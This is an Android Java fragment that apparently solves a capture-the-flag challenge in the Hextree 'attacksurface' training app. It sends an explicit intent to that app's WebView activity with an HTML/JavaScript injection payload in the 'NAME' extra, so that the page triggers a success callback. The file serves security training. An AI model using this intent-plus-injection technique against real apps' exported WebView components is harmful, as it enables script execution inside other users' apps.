package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag39Fragment extends Fragment {
    private static final String TAG = "Flag39Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag39, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag39);
        
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface",
                    "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"));
            intent.putExtra("NAME", "</br><img src=x onerror='window.hextree.success()'</img><br>");
            startActivity(intent);
        });

        return view;
    }
} 